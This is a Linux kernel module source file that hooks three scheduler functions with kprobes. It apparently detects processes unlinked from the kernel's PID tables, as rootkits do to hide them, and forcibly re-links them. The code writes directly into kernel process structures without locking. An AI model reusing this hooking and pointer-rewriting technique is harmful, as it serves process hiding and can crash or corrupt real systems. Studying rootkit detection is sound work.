
#include <linux/init.h>
#include <linux/module.h>
# include <linux/sched.h>
  # include <linux/pid.h>
#include <linux/kprobes.h>
#include <linux/kernel.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Your Name");
MODULE_DESCRIPTION("A Simple Kernel Module");





//module_param(pid, int, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH); // 定义一个名为 num 的内核模块参数



static int handler_pre(struct kprobe *p, struct pt_regs *regs)
{
	struct task_struct *cur = (struct task_struct *)(regs->si);
	
	
	//no kernel process
	if(cur->mm!=NULL)
{
	
	if((unsigned long )cur->pids[PIDTYPE_PID].pid->tasks[PIDTYPE_PID].first !=   (unsigned long) cur->pids   )
	{	
		//printk("hide process runAAAAAA\n");
		void* a=(void*)(cur->pids);
		(cur->pids[PIDTYPE_PID].pid->tasks[PIDTYPE_PID].first)=a;
		return 0;
	}
	
	if( (unsigned long)*(cur->pids[PIDTYPE_PID].node.pprev) !=  (unsigned long)(cur->pids)   )
	{	
		//printk("hide process runBBB\n");
		(*(cur->pids[PIDTYPE_PID].node.pprev))=(void*)(cur->pids);
		return 0;
	}

	if( find_vpid(cur->pid)==NULL)
	{
		//printk("hide process runCCCC\n");
		return 0;
	}




}
	return 0;
}


static void handler_post(struct kprobe *p, struct pt_regs *regs,
				unsigned long flags)
{
	
}


static struct kprobe kp1 = {
	.symbol_name	= "pick_next_task_fair",
	.post_handler   =handler_post,
	.pre_handler    =handler_pre,
};


static struct kprobe kp2 = {
	.symbol_name	= "pick_next_task_dl",
	.post_handler   =handler_post,
	.pre_handler    =handler_pre,
};


static struct kprobe kp3 = {
	.symbol_name	= "pick_next_task_rt",
	.post_handler   =handler_post,
	.pre_handler    =handler_pre,
};



static int __init aa_init(void)
{
    //task=pid_task(find_vpid(pid), PIDTYPE_PID);
	
	
	

	register_kprobe(&kp1);
	register_kprobe(&kp2);
	register_kprobe(&kp3);
    



    return 0;
}

static void __exit aa_exit(void)
{
    printk(KERN_ALERT "Goodbye, aa\n");
    unregister_kprobe(&kp1);
    unregister_kprobe(&kp2);
    unregister_kprobe(&kp3);
}

module_init(aa_init);
module_exit(aa_exit);
